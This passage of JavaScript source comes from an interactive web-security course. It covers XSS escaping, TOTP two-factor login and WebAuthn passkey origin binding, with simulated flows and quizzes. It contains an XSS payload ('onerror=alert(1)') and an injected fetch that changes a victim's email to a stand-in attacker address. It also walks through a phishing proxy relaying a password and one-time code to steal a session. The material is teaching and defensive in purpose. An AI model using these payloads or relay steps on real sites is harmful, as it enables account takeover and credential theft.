          { from: 'b', to: 's', kind: 'err', label: 'fetch POST /api/account/email', msg: "// the injected script instead does:\nfetch('/api/account/email', { method: 'POST', body: 'email=mallory@evil.test' })\n\nPOST /api/account/email HTTP/1.1\nHost: shop.test\nCookie: sid=Hn4t…\nOrigin: https://shop.test\nSec-Fetch-Site: same-origin",
            hl: ['Cookie', 'same-origin'], note: 'But the script runs <b>inside</b> shop.test: its requests are same-origin, carry the cookie and even pass CSRF checks (it can read the CSRF token from the page).' },
          { from: 's', to: 'b', kind: 'res', label: '200 email changed', msg: 'HTTP/1.1 200 OK\n\n{"email":"mallory@evil.test"}', set: { s: { 'alice.email': 'mallory@evil.test' } },
            note: 'XSS = game over for that session. HttpOnly limits the damage (no stolen long-lived credential); only <b>preventing XSS</b> fixes it: escape output, CSP, Trusted Types.' },
        ]) },
      ],
    });
  });

  function escExercise() {
    const PAY = '<img src=x onerror=alert(1)>';
    $('#ans').value = CFG.value;
    $('#check').onclick = () => {
      const t = document.createElement('template');
      t.innerHTML = $('#ans').value;
      const d = t.content; // inert: nothing loads or runs
      const ok = d.children.length === 0 && d.textContent === PAY;
      $('#preview').innerHTML = '';
      $('#preview').appendChild(document.createTextNode(d.children.length ? '⚠️ created ' + d.children.length + ' element(s): <' + d.children[0].tagName.toLowerCase() + '>' : 'renders as: ' + d.textContent));
      const r = $('#result');
      r.className = 'result ' + (ok ? 'ok' : 'bad');
      r.innerHTML = ok ? '✅ Safe: the browser shows the payload as plain text and creates no element.' :
        d.children.length ? '❌ The browser still parses this as a real element. Replace <code>&lt;</code> with <code>&amp;lt;</code> and <code>&gt;</code> with <code>&amp;gt;</code>.' :
          '❌ No element, but the visible text must be exactly <code>' + esc(PAY) + '</code> (you changed the content).';
    };
  }
  const escExHtml = `
<div class="card">
  <h4>Escape a malicious review</h4>
  <div class="muted">The review text is <code>&lt;img src=x onerror=alert(1)&gt;</code>. The server inserts your string into HTML as-is.
    Write the HTML-escaped version so the reader sees exactly that text and no image element is created.</div>
  <input id="ans" class="code" style="margin-top:6px">
  <div class="row"><button id="check" class="primary">Check</button> <span id="preview" class="muted"></span></div>
  <div id="result" class="result"></div>
</div>`;

  // ======================= mfa-totp =======================
  function TOTPLIB() {
    window.B32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    window.b32enc = (bytes) => { let bits = '', out = ''; bytes.forEach((b) => (bits += b.toString(2).padStart(8, '0'))); for (let i = 0; i < bits.length; i += 5) out += B32[parseInt(bits.slice(i, i + 5).padEnd(5, '0'), 2)]; return out; };
    window.b32dec = (s) => { s = s.toUpperCase().replace(/[^A-Z2-7]/g, ''); let bits = ''; for (const c of s) bits += B32.indexOf(c).toString(2).padStart(5, '0'); const out = []; for (let i = 0; i + 8 <= bits.length; i += 8) out.push(parseInt(bits.slice(i, i + 8), 2)); return new Uint8Array(out); };
    window.hexToBytes = (h) => new Uint8Array(h.match(/../g).map((x) => parseInt(x, 16)));
    window.hotp = (key, counter, digits) => {
      const msg = new Uint8Array(8);
      let c = counter;
      for (let i = 7; i >= 0; i--) { msg[i] = c % 256; c = Math.floor(c / 256); }
      const mac = hexToBytes(Auth.hmacSha256hex(key, msg));
      const off = mac[mac.length - 1] & 0x0f;
      const bin = ((mac[off] & 0x7f) << 24) | (mac[off + 1] << 16) | (mac[off + 2] << 8) | mac[off + 3];
      const d = digits || 6;
      return { msg, mac, off, bin, code: String(bin % Math.pow(10, d)).padStart(d, '0') };
    };
  }
  function TW(html, fn, cfg) { return W(html, new Function('(' + TOTPLIB.toString() + ')();\n(' + fn.toString() + ')();'), cfg); }

  const totpLab = TW(`
<div class="grid2">
  <div class="card">
    <h4>📱 Authenticator app (alice’s phone)</h4>
    <div class="row muted">secret (Base32) <input id="sec" class="code" style="width:270px"> <button id="newsec" class="chip">🎲</button></div>
    <div style="display:flex;align-items:center;gap:14px;margin:6px 0">
      <svg width="76" height="76" viewBox="0 0 76 76"><circle cx="38" cy="38" r="32" fill="none" stroke="#e2e5ee" stroke-width="7"/>
        <circle id="ring" cx="38" cy="38" r="32" fill="none" stroke="#087ea4" stroke-width="7" stroke-linecap="round" transform="rotate(-90 38 38)" stroke-dasharray="201.06"/>
        <text id="secs" x="38" y="44" text-anchor="middle" font-size="18" font-weight="700" fill="#1f2330"></text></svg>
      <div><div id="code" style="font:700 34px ui-monospace,Menlo,monospace;letter-spacing:4px"></div>
        <div class="muted">HMAC-<b>SHA-256</b> variant (RFC 6238 allows it; most apps default to SHA-1)</div></div>
    </div>
    <div class="row muted">phone clock drift <input id="drift" type="range" min="-90" max="90" step="5" value="0"> <b id="dv">0 s</b>
      <button id="ff" class="chip">⏩ jump +30 s</button></div>
  </div>
  <div class="card">
    <h4>🖥 Server: verify a code (window ±1 step)</h4>
    <div class="row"><input id="in" class="code" style="width:120px" maxlength="6" placeholder="6 digits"><button id="ver" class="primary">Verify</button>
      <button id="copy" class="chip">copy phone code ↓</button></div>
    <div id="vres" style="margin-top:6px;font-size:13.5px"></div>
    <div class="muted" style="margin-top:6px;font-size:12px">Server clock is exact. It accepts the codes for steps T−1, T and T+1 to tolerate drift and slow typing, and rejects a code that was already used (replay).</div>
  </div>
</div>
<div class="card">
  <h4>🔬 How the phone computed it (live)</h4>
  <table class="t" id="steps" style="font-size:12.5px"></table>
  <div id="selftest" class="muted" style="margin-top:4px;font-size:12px"></div>
</div>
`, function () {
    let extra = 0, lastUsed = -1;
    const key = () => b32dec($('#sec').value);
    $('#sec').value = b32enc(crypto.getRandomValues(new Uint8Array(20)));
    $('#newsec').onclick = () => { $('#sec').value = b32enc(crypto.getRandomValues(new Uint8Array(20))); lastUsed = -1; tick(); };
    $('#ff').onclick = () => { extra += 30; tick(); };
    $('#drift').oninput = () => { $('#dv').textContent = $('#drift').value + ' s'; tick(); };
    const phoneNow = () => Date.now() / 1000 + extra + +$('#drift').value;
    const serverNow = () => Date.now() / 1000 + extra;
    function tick() {
      const t = phoneNow(), T = Math.floor(t / 30), left = 30 - (t % 30);
      const r = hotp(key(), T);
      $('#code').textContent = r.code.slice(0, 3) + ' ' + r.code.slice(3);
      $('#secs').textContent = Math.ceil(left);
      $('#ring').setAttribute('stroke-dashoffset', String(201.06 * (1 - left / 30)));
      $('#ring').setAttribute('stroke', left < 6 ? '#dc2626' : '#087ea4');
      const macHex = Auth.hex(r.mac);
      const macHtml = macHex.replace(/../g, (b, i) => { const k = i / 2; return k === r.mac.length - 1 ? '<mark>' + b + '</mark>' : k >= r.off && k < r.off + 4 ? '<b style="background:#dbeafe">' + b + '</b>' : b; });
      $('#steps').innerHTML = [
        ['① Unix time (phone)', Math.floor(t) + ' s  (' + new Date(t * 1000).toISOString().slice(11, 19) + ' UTC)'],
        ['② Time step T = floor(time / 30)', '<b>' + T + '</b>   (changes every 30 s; ' + Math.ceil(left) + ' s left)'],
        ['③ T as 8-byte big-endian counter', Auth.hex(r.msg).replace(/(..)/g, '$1 ')],
        ['④ HMAC-SHA-256(secret, counter)', '<span style="word-break:break-all">' + macHtml + '</span>'],
        ['⑤ Dynamic truncation', 'last byte <mark>' + macHex.slice(-2) + '</mark> & 0x0f = offset <b>' + r.off + '</b> → take 4 bytes <b style="background:#dbeafe">' + macHex.slice(r.off * 2, r.off * 2 + 8) + '</b>, clear top bit → <b>' + r.bin + '</b>'],
        ['⑥ mod 10⁶ → 6 digits', '<b style="font-size:15px">' + r.code + '</b>'],
      ].map((x) => '<tr><th style="width:230px">' + x[0] + '</th><td><code style="background:none">' + x[1] + '</code></td></tr>').join('');
    }
    $('#copy').onclick = () => { $('#in').value = $('#code').textContent.replace(' ', ''); };
    $('#ver').onclick = () => {
      const T = Math.floor(serverNow() / 30), v = $('#in').value.trim();
      const rows = [-1, 0, 1].map((d) => [d, hotp(key(), T + d).code]);
      const hit = rows.find((x) => x[1] === v);
      let msg = '<table class="t"><tr><th>step</th><th>expected</th></tr>' + rows.map((x) => '<tr><td>T' + (x[0] ? (x[0] > 0 ? '+1' : '−1') : '') + ' = ' + (T + x[0]) + '</td><td><code>' + x[1] + '</code>' + (hit && hit[0] === x[0] ? ' ⬅' : '') + '</td></tr>').join('') + '</table>';
      if (!hit) msg += '<div class="pill bad" style="margin-top:4px">❌ rejected</div> ' + (v.length !== 6 ? 'Enter 6 digits.' : 'Not in the ±1 window. Wrong secret, or the phone clock is off by more than ~30 s.');
      else if (T + hit[0] <= lastUsed) msg += '<div class="pill bad" style="margin-top:4px">❌ replay</div> This step was already used. One code = one login.';
      else { lastUsed = T + hit[0]; msg += '<div class="pill ok" style="margin-top:4px">✅ accepted</div> matched step ' + (hit[0] ? (hit[0] > 0 ? 'T+1' : 'T−1') + ' (clock drift tolerated)' : 'T'); }
      $('#vres').innerHTML = msg;
    };
    const tv = hotp(new TextEncoder().encode('12345678901234567890123456789012'), Math.floor(59 / 30), 8).code;
    $('#selftest').innerHTML = 'Self-test against the RFC 6238 SHA-256 test vector (time 59 s, 8 digits): got <code>' + tv + '</code>, expected <code>46119246</code> ' + (tv === '46119246' ? '✅' : '❌');
    tick();
    setInterval(tick, 250);
  });

  const mfaSeq = TW(`<div id="flow"></div>`, function () {
    const key = new TextEncoder().encode('demo-secret-alice-20b');
    const T = Math.floor(Date.now() / 30000), code = hotp(key, T).code;
    const pre = Auth.randB64url(12), full = Auth.randB64url(16);
    const CK = '; Path=/; HttpOnly; Secure; SameSite=Lax';
    Seq.mount('#flow', {
      title: 'Login with a second factor',
      scenarios: [
        { name: '✅ Password + TOTP', actors: [
            { id: 'p', label: 'Phone app', icon: '📱', store: { secret: 'shared at enrollment (QR)' }, storeLabel: 'Phone' },
            { id: 'b', label: 'Browser', icon: '🌐', store: {}, storeLabel: 'Cookie jar' },
            { id: 's', label: 'shop.test', icon: '🖥', store: { 'alice.totp_secret': '(encrypted at rest)' }, storeLabel: 'Server' }],
          steps: [
            { from: 'b', to: 's', label: 'POST /login (password)', msg: 'POST /login HTTP/1.1\nHost: shop.test\nContent-Type: application/x-www-form-urlencoded\n\nusername=alice&password=wonder1and' },
            { from: 's', to: 's', label: 'password ✓ → half-logged-in', note: 'Factor 1 OK. The session is marked <code>mfa=pending</code>: it must not grant access yet.',
              set: { s: { ['session ' + pre]: 'user=alice, mfa=pending' } } },
            { from: 's', to: 'b', kind: 'redirect', label: '303 /login/totp + Set-Cookie', msg: 'HTTP/1.1 303 See Other\nLocation: /login/totp\nSet-Cookie: sid=' + pre + CK, set: { b: { sid: pre } } },
            { from: 'p', to: 'p', label: 'compute code for T=' + T, msg: '# T = floor(unix_time / 30) = ' + T + '\n# code = Truncate(HMAC(secret, T)) mod 10^6\n' + code, note: 'The phone needs no network: it shares a secret with the server and both know the time.' },
            { from: 'p', to: 'b', kind: 'info', label: 'alice types ' + code, msg: code },
            { from: 'b', to: 's', label: 'POST /login/totp', msg: 'POST /login/totp HTTP/1.1\nHost: shop.test\nCookie: sid=' + pre + '\nContent-Type: application/x-www-form-urlencoded\n\ncode=' + code, hl: ['code=' + code] },
            { from: 's', to: 's', label: 'verify T−1, T, T+1 ✓', note: 'Server computes the code for its own time step (±1). Match → mark step ' + T + ' as used (no replay), and <b>rotate the session id</b> (new privilege level).',
              set: { s: { ['session ' + pre]: null, ['session ' + full]: 'user=alice, mfa=done, amr=[pwd,otp]' } } },
            { from: 's', to: 'b', kind: 'redirect', label: '303 /dashboard + new sid', msg: 'HTTP/1.1 303 See Other\nLocation: /dashboard\nSet-Cookie: sid=' + full + CK, set: { b: { sid: full } } },
          ] },
        { name: '🎣 Real-time phishing relay', actors: [
            { id: 'b', label: 'Alice’s browser', icon: '🌐' },
            { id: 'x', label: 'shop-login.evil.test (proxy)', icon: '🎣', store: {}, storeLabel: 'Phisher captured' },
            { id: 's', label: 'shop.test', icon: '🖥' }],
          steps: [
            { from: 'b', to: 'x', label: 'POST /login (on fake site)', msg: 'POST /login HTTP/1.1\nHost: shop-login.evil.test\n\nusername=alice&password=wonder1and', note: 'Alice clicked a link in an email. The page looks exactly like shop.test (the proxy copies it live).',
              set: { x: { password: 'wonder1and' } } },
            { from: 'x', to: 's', label: 'relay password', msg: 'POST /login HTTP/1.1\nHost: shop.test\n\nusername=alice&password=wonder1and', note: 'Tools like evilginx forward everything to the real site in real time.' },
            { from: 's', to: 'x', kind: 'redirect', label: '303 /login/totp', msg: 'HTTP/1.1 303 See Other\nLocation: /login/totp' },
            { from: 'x', to: 'b', kind: 'res', label: '“enter your code”', msg: 'HTTP/1.1 200 OK\n\n<form>Enter the 6-digit code…</form>' },
            { from: 'b', to: 'x', label: 'POST code ' + code, msg: 'POST /login/totp HTTP/1.1\nHost: shop-login.evil.test\n\ncode=' + code, set: { x: { code: code + ' (valid ~30–60 s)' } },
              note: 'Alice has no way to know: the code itself says nothing about which site asked for it.' },
            { from: 'x', to: 's', label: 'relay code within seconds', msg: 'POST /login/totp HTTP/1.1\nHost: shop.test\n\ncode=' + code },
            { from: 's', to: 'x', kind: 'err', label: '303 + Set-Cookie: sid 💥', msg: 'HTTP/1.1 303 See Other\nSet-Cookie: sid=' + full + CK, set: { x: { 'session cookie': full } },
              note: 'The phisher now holds a fully authenticated session. <b>OTP codes (TOTP, SMS, email) are phishable.</b> Passkeys (next lesson) are not, because the browser binds them to the real origin.' },
          ] },
      ],
    });
  });

  function stepExercise() {
    const ids = ['t1', 't2', 't3'];
    ids.forEach((id, i) => ($('#' + id).value = CFG.v[i]));
    $('#acc').value = CFG.v[3];
    $('#check').onclick = () => {
      const want = ['58907520', '58907520', '58907521', 'reject'];
      const got = ids.map((id) => $('#' + id).value.trim()).concat($('#acc').value);
      const why = ['1767225600 / 30 = 58907520 exactly.', '1767225629 / 30 = 58907520.97 → floor → same step: the code doesn’t change for 30 s.', '1767225630 / 30 = 58907521 → a new step, a new code.',
        'Server step 58907521, code from 58907519: difference 2 > window 1 → rejected.'];
      let good = 0;
      const tips = ['Row 1: divide the Unix time by 30 and drop the fraction.', 'Row 2: 29 more seconds… is that a full 30 s step?', 'Row 3: 30 more seconds than row 1.',
        'Last question: how many steps apart are 58907519 and 58907521, and how many does a ±1 window allow?'];
      const fb = got.map((g, i) => { const ok = g === want[i]; if (ok) good++; return ok ? '✅ ' + why[i] : '❌ ' + tips[i]; });
      const r = $('#result');
      r.className = 'result ' + (good === 4 ? 'ok' : 'bad');
      r.innerHTML = (good === 4 ? '✅ All correct! ' : '❌ ' + good + ' / 4 correct.') + '<br>' + fb.join('<br>');
    };
  }
  const stepExHtml = `
<div class="card">
  <h4>Time steps (period = 30 s, T₀ = 0)</h4>
  <table class="t">
    <tr><th>Unix time</th><th>Date (UTC)</th><th>T = floor(time / 30)</th></tr>
    <tr><td><code>1767225600</code></td><td>2026-01-01 00:00:00</td><td><input id="t1" class="code" style="width:140px"></td></tr>
    <tr><td><code>1767225629</code></td><td>2026-01-01 00:00:29</td><td><input id="t2" class="code" style="width:140px"></td></tr>
    <tr><td><code>1767225630</code></td><td>2026-01-01 00:00:30</td><td><input id="t3" class="code" style="width:140px"></td></tr>
  </table>
  <div class="row" style="margin-top:6px">The server is at step <code>58907521</code> and accepts ±1 step. A code generated at step <code>58907519</code> arrives. The server will
    <select id="acc"><option value=""></option><option value="accept">accept</option><option value="reject">reject</option></select></div>
  <div class="row"><button id="check" class="primary">Check</button></div>
  <div id="result" class="result"></div>
</div>`;

  // ======================= webauthn-passkeys =======================
  const waSeq = W(`<div id="flow"></div>`, function () {
    const RP = 'bank.test', ORIGIN = 'https://bank.test';
    const ch1 = Auth.randB64url(32), ch2 = Auth.randB64url(32), credId = Auth.randB64url(16), userId = Auth.randB64url(16);
    const priv = Auth.randHex(32);
    const pubX = Auth.randB64url(32), pubY = Auth.randB64url(32);
    const rpHash = Auth.sha256hex(RP);
    const cd = (type, ch, origin) => JSON.stringify({ type, challenge: ch, origin, crossOrigin: false });
    const cdReg = cd('webauthn.create', ch1, ORIGIN), cdGet = cd('webauthn.get', ch2, ORIGIN);
    const authData = rpHash + '05' + '00000001';
    const sig = Auth.hmacSha256b64url(priv, authData + Auth.sha256hex(cdGet));
    const J = (o) => JSON.stringify(o, null, 2);
    const A = [
      { id: 'a', label: 'Authenticator', icon: '🔑', store: {}, storeLabel: 'Authenticator (Touch ID / phone)' },
      { id: 'b', label: 'Browser', icon: '🌐', store: { 'page origin': ORIGIN }, storeLabel: 'Browser' },
      { id: 's', label: 'bank.test', icon: '🏦', store: {}, storeLabel: 'Server DB' },
    ];
    const reg = [
      { from: 'b', to: 's', label: 'POST /webauthn/register/options', msg: 'POST /webauthn/register/options HTTP/1.1\nHost: bank.test\nCookie: sid=…', note: 'Alice (already logged in) clicks “Create a passkey”.' },
      { from: 's', to: 'b', kind: 'res', label: '200 creation options + challenge', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n' + J({ challenge: ch1, rp: { id: RP, name: 'Bank' }, user: { id: userId, name: 'alice', displayName: 'Alice' }, pubKeyCredParams: [{ type: 'public-key', alg: -7 }, { type: 'public-key', alg: -257 }], authenticatorSelection: { residentKey: 'required', userVerification: 'preferred' }, timeout: 60000 }),
        hl: ['challenge', '"id": "bank.test"'], note: 'A fresh random <b>challenge</b> and the <b>rp.id</b> (relying party = the website). <code>alg: -7</code> = ES256 (ECDSA P-256).', set: { s: { 'pending challenge': ch1.slice(0, 12) + '…' } } },
      { from: 'b', to: 'b', label: 'navigator.credentials.create()', msg: '// browser checks: rp.id "bank.test" matches page origin https://bank.test ✓\n// and builds clientDataJSON:\n' + cdReg, hl: ['"origin":"https://bank.test"'],
        note: 'The <b>browser</b> (not the page) writes the real origin into <code>clientDataJSON</code>. A page can’t lie about where it is.' },
      { from: 'b', to: 'a', label: 'makeCredential(rpIdHash, clientDataHash)', msg: 'authenticatorMakeCredential\nrpId: bank.test\nrpIdHash: ' + rpHash + '\nclientDataHash: ' + Auth.sha256hex(cdReg) + '\nuser: alice' },
      { from: 'a', to: 'a', label: 'user verification + new key pair', note: 'Alice touches the fingerprint sensor. The authenticator creates a brand-new key pair <b>just for bank.test</b>. The private key never leaves the device (or, for synced passkeys, is end-to-end encrypted in her password manager).',
        set: { a: { ['passkey ' + credId.slice(0, 8) + '…']: 'rpId=bank.test, user=alice, privateKey=🔒' } } },
      { from: 'a', to: 'b', kind: 'res', label: 'attestationObject (public key)', msg: '# attestationObject (CBOR), decoded:\nfmt: "none"\nauthData.rpIdHash: ' + rpHash + '\nauthData.flags: UP UV BE BS\nauthData.signCount: 0\ncredentialId: ' + credId + '\ncredentialPublicKey: { kty: EC2, alg: -7 (ES256), crv: P-256, x: ' + pubX.slice(0, 16) + '…, y: ' + pubY.slice(0, 16) + '… }' },
      { from: 'b', to: 's', label: 'POST /webauthn/register', msg: 'POST /webauthn/register HTTP/1.1\nHost: bank.test\nContent-Type: application/json\n\n' + J({ id: credId, rawId: credId, type: 'public-key', response: { clientDataJSON: Auth.b64url(cdReg).slice(0, 40) + '…', attestationObject: 'o2NmbXRkbm9uZWdhdHRTdG10oGhhdXRoRGF0YVj…' } }) },
      { from: 's', to: 's', label: 'verify & store public key', note: 'Checks: <code>type = webauthn.create</code>, challenge = the pending one, <code>origin = https://bank.test</code>, rpIdHash = SHA-256("bank.test"), UP/UV flags. Then store only the <b>public</b> key. A database leak reveals nothing usable.',
        set: { s: { 'pending challenge': null, ['credential ' + credId.slice(0, 8) + '…']: 'alice, ES256 pubkey, signCount=0' } } },
      { from: 's', to: 'b', kind: 'res', label: '201 Created', msg: 'HTTP/1.1 201 Created\n\n{"status":"ok"}' },
    ];
    const regDone = { a: { ['passkey ' + credId.slice(0, 8) + '…']: 'rpId=bank.test, user=alice, privateKey=🔒' }, s: { ['credential ' + credId.slice(0, 8) + '…']: 'alice, ES256 pubkey, signCount=0' } };
    const login = [
      { from: 'b', to: 's', label: 'POST /webauthn/login/options', msg: 'POST /webauthn/login/options HTTP/1.1\nHost: bank.test', set: regDone, note: 'Later, on the login page: “Sign in with a passkey”. No username or password needed.' },
      { from: 's', to: 'b', kind: 'res', label: '200 request options + challenge', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n' + J({ challenge: ch2, rpId: RP, allowCredentials: [], userVerification: 'preferred', timeout: 60000 }), hl: ['challenge', 'rpId'],
        set: { s: { 'pending challenge': ch2.slice(0, 12) + '…' } }, note: 'A new challenge every time, so an old signature can never be replayed.' },
      { from: 'b', to: 'b', label: 'navigator.credentials.get()', msg: '// rpId "bank.test" vs origin https://bank.test ✓\n' + cdGet, hl: ['"origin":"https://bank.test"', 'webauthn.get'] },
      { from: 'b', to: 'a', label: 'getAssertion(rpId=bank.test, clientDataHash)', msg: 'authenticatorGetAssertion\nrpId: bank.test\nclientDataHash: ' + Auth.sha256hex(cdGet) },
      { from: 'a', to: 'a', label: 'find key for bank.test, verify user, sign', msg: '# authenticatorData = rpIdHash | flags(UP,UV) | signCount\n' + authData + '\n# signature = Sign(privateKey, authenticatorData || clientDataHash)\n# SIMULATED here with HMAC-SHA-256 (real: ECDSA P-256 / ES256)\n' + sig,
        hl: ['SIMULATED'], note: 'Keys are looked up <b>by rpId</b>. Fingerprint/PIN unlock it locally (they never go to the server).', set: { a: { signCount: '1' } } },
      { from: 'a', to: 'b', kind: 'res', label: 'assertion', msg: 'credentialId: ' + credId + '\nauthenticatorData: ' + Auth.b64url(authData).slice(0, 30) + '…\nsignature: ' + sig + '\nuserHandle: ' + userId },
      { from: 'b', to: 's', label: 'POST /webauthn/login', msg: 'POST /webauthn/login HTTP/1.1\nHost: bank.test\nContent-Type: application/json\n\n' + J({ id: credId, type: 'public-key', response: { clientDataJSON: Auth.b64url(cdGet).slice(0, 40) + '…', authenticatorData: Auth.b64url(authData).slice(0, 24) + '…', signature: sig.slice(0, 24) + '…', userHandle: userId } }) },
      { from: 's', to: 's', label: 'verify signature with stored public key', note: 'Look up the public key by credentialId. Verify the signature; check challenge, <code>origin === "https://bank.test"</code>, rpIdHash, UP/UV flags, signCount increased.',
        set: { s: { 'pending challenge': null, ['credential ' + credId.slice(0, 8) + '…']: 'alice, ES256 pubkey, signCount=1' } } },
      { from: 's', to: 'b', kind: 'redirect', label: '303 /dashboard + Set-Cookie', msg: 'HTTP/1.1 303 See Other\nLocation: /dashboard\nSet-Cookie: __Host-sid=' + Auth.randB64url(16) + '; Path=/; Secure; HttpOnly; SameSite=Lax' },
    ];
    const evilOrigin = 'https://bank-login.evil.test';
    const phish = [
      { from: 'b', to: 'x', label: 'GET bank-login.evil.test', msg: 'GET / HTTP/1.1\nHost: bank-login.evil.test', set: regDone, note: 'Alice falls for a phishing email, just like in the TOTP lesson.' },
      { from: 'x', to: 's', kind: 'back', label: 'fetch real challenge', msg: 'POST /webauthn/login/options HTTP/1.1\nHost: bank.test', note: 'The phisher relays: it gets a genuine challenge from the bank.' },
      { from: 'x', to: 'b', kind: 'res', label: 'page calls credentials.get(rpId: bank.test)', msg: "navigator.credentials.get({ publicKey: {\n  challenge: <bank's challenge>,\n  rpId: 'bank.test',\n} })" },
      { from: 'b', to: 'b', kind: 'err', label: 'SecurityError ✗', msg: "SecurityError: The relying party ID 'bank.test' is not a registrable domain suffix of,\nnor equal to, the current domain 'bank-login.evil.test'.", hl: ['SecurityError'],
        note: '<b>Origin binding.</b> The browser only lets a page use an rpId equal to its own domain or a parent of it. evil.test can never ask for bank.test keys.' },
      { from: 'x', to: 'b', kind: 'res', label: 'retry with rpId: bank-login.evil.test', msg: "navigator.credentials.get({ publicKey: { challenge, rpId: 'bank-login.evil.test' } })" },
      { from: 'b', to: 'a', label: 'getAssertion(rpId=bank-login.evil.test)', msg: 'authenticatorGetAssertion\nrpId: bank-login.evil.test\nclientDataHash: SHA-256(' + cd('webauthn.get', 'bank-challenge', evilOrigin) + ')' },
      { from: 'a', to: 'b', kind: 'err', label: 'no credential for this rpId', msg: 'NotAllowedError: no passkey available for bank-login.evil.test', note: 'Alice’s passkey belongs to <code>bank.test</code>. There is nothing to sign. And even a signature over this clientDataJSON would say <code>origin: ' + evilOrigin + '</code> and carry the wrong rpIdHash, so bank.test would reject it.' },
      { from: 'x', to: 'x', kind: 'info', label: 'phisher gets nothing reusable', note: 'Unlike a password or a 6-digit code, there is no secret the user could type into the wrong site. That is why passkeys are called <b>phishing-resistant</b>.' },
    ];
    Seq.mount('#flow', {
      title: 'WebAuthn / passkeys (Level 3)',
      actors: A,
      scenarios: [
        { name: '① Registration', steps: reg },
        { name: '② Authentication', steps: login },
        { name: '🎣 Phishing attempt', actors: [A[0], A[1], { id: 'x', label: 'bank-login.evil.test', icon: '🎣' }, A[2]], steps: phish },
      ],
    });
  });

  const rpLab = W(`
<div class="card">
  <h4>🔗 Origin-binding lab</h4>
  <div class="muted">Alice’s authenticator holds one passkey: <code>rpId = bank.test</code>. bank.test’s server accepts origins
    <code>https://bank.test</code> and <code>https://login.bank.test</code>.</div>
  <div class="row" style="margin-top:6px">
    <label>Page origin <select id="org">
      <option>https://bank.test</option><option>https://login.bank.test</option><option>https://bank-login.evil.test</option>
      <option>https://bank.test.evil.test</option><option>http://bank.test</option></select></label>
    <label>rpId the page asks for <select id="rp"><option>bank.test</option><option>login.bank.test</option><option>bank-login.evil.test</option><option>evil.test</option></select></label>
    <button id="go" class="primary">Sign in with passkey</button>
  </div>
</div>
<div class="grid2">
  <div class="card"><h4>Checks</h4><div id="trace"></div></div>
  <div class="card"><h4>Signed data</h4><pre id="data" class="seq-msg" style="max-height:300px"></pre></div>
</div>
`, function () {
    const PRIV = Auth.randHex(32);
    function regSuffix(host, rp) { return host === rp || host.endsWith('.' + rp); }
    function run() {
      const origin = $('#org').value, rp = $('#rp').value, u = new URL(origin), host = u.hostname;
      const T = [];
      const add = (ok, who, t) => T.push('<div style="margin:3px 0">' + (ok ? '✅' : '❌') + ' <b>' + who + ':</b> ' + t + '</div>');
      let data = '# nothing signed';
      const fin = (ok, t) => T.push('<div class="pill ' + (ok ? 'ok' : 'bad') + '" style="margin-top:6px">' + t + '</div>');
      (function () {
        if (u.protocol !== 'https:') { add(false, 'Browser', 'WebAuthn needs a secure context (https, or localhost). <code>navigator.credentials</code> refuses on http://.'); return fin(false, 'Blocked by browser'); }
        add(true, 'Browser', 'secure context (https)');
        if (!regSuffix(host, rp) || rp === 'test') { add(false, 'Browser', 'rpId <code>' + rp + '</code> is not <code>' + host + '</code> or a parent domain of it → <code>SecurityError</code>.'); return fin(false, 'Blocked by browser'); }
        add(true, 'Browser', 'rpId <code>' + rp + '</code> ' + (rp === host ? 'equals' : 'is a parent domain of') + ' <code>' + host + '</code>');
        const cdj = JSON.stringify({ type: 'webauthn.get', challenge: Auth.randB64url(16), origin, crossOrigin: false });
        if (rp !== 'bank.test') { add(false, 'Authenticator', 'no passkey for rpId <code>' + rp + '</code> (only bank.test) → nothing to sign.'); data = '# clientDataJSON built by the browser:\n' + cdj; return fin(false, 'No passkey found'); }
        add(true, 'Authenticator', 'found alice’s passkey for bank.test, user verified, signed');
        const ad = Auth.sha256hex(rp) + '05' + '00000007';
        data = '# clientDataJSON (written by the BROWSER, page can’t change it)\n' + cdj + '\n\n# authenticatorData: rpIdHash = SHA-256("' + rp + '")\n' + ad +
          '\n\n# signature (SIMULATED with HMAC-SHA-256; real: ECDSA P-256)\n' + Auth.hmacSha256b64url(PRIV, ad + Auth.sha256hex(cdj));
        const okOrigin = origin === 'https://bank.test' || origin === 'https://login.bank.test';
        add(true, 'Server', 'signature valid for the stored public key');
        add(Auth.sha256hex(rp) === Auth.sha256hex('bank.test'), 'Server', 'rpIdHash = SHA-256("bank.test")');
        if (!okOrigin) { add(false, 'Server', 'clientDataJSON.origin <code>' + origin + '</code> is not an expected origin.'); return fin(false, 'Rejected by server'); }
        add(true, 'Server', 'origin <code>' + origin + '</code> is expected; challenge matches');
        fin(true, 'Logged in as alice');
      })();
      $('#trace').innerHTML = T.join('');
      paint($('#data'), data, ['"origin"', 'SIMULATED']);
    }
    $('#go').onclick = run;
    $$('select').forEach((s) => s.addEventListener('change', run));
    run();
  });

  function waExercise() {
    const ANS = ['ok', 'browser', 'nokey', 'server', 'ok'];
    $$('select.q').forEach((s, i) => { s.value = CFG.fill ? ANS[i] : ''; });
    $('#check').onclick = () => {
      const why = ['Origin, rpId and passkey all match.', 'bank.test is not bank-login.evil.test or a parent of it → SecurityError.', 'evil.test may use rpId evil.test, but alice has no passkey for it.',
        'login.bank.test may use rpId bank.test, but the server only expects https://bank.test in clientDataJSON.origin.', 'A subdomain using its parent domain as rpId, and the server expects this origin.'];
      let good = 0;
      $$('select.q').forEach((s, i) => {
        const ok = s.value === ANS[i];
        if (ok) good++;
        s.style.background = s.value ? (ok ? '#dcfce7' : '#fee2e2') : '';
        $$('.fb')[i].textContent = s.value ? (ok ? '✅ ' : '❌ ') + why[i] : '';
      });
      const r = $('#result');
      r.className = 'result ' + (good === 5 ? 'ok' : 'bad');
      r.innerHTML = good === 5 ? '✅ 5 / 5. You understand origin binding.' : '❌ ' + good + ' / 5 correct.';
    };
  }
  const waSel = '<select class="q"><option></option><option value="ok">✅ succeeds</option><option value="browser">❌ browser blocks</option><option value="nokey">❌ no passkey found</option><option value="server">❌ server rejects</option></select>';
  const waExHtml = `
<div class="card">
  <h4>Will the passkey sign-in succeed?</h4>
  <table class="t">
    <tr><th>#</th><th>Page origin</th><th>rpId requested</th><th>Situation</th><th>Outcome</th><th></th></tr>
    <tr><td>1</td><td>https://bank.test</td><td>bank.test</td><td>alice has a bank.test passkey</td><td>${waSel}</td><td class="fb"></td></tr>
    <tr><td>2</td><td>https://bank-login.evil.test</td><td>bank.test</td><td>phishing page</td><td>${waSel}</td><td class="fb"></td></tr>
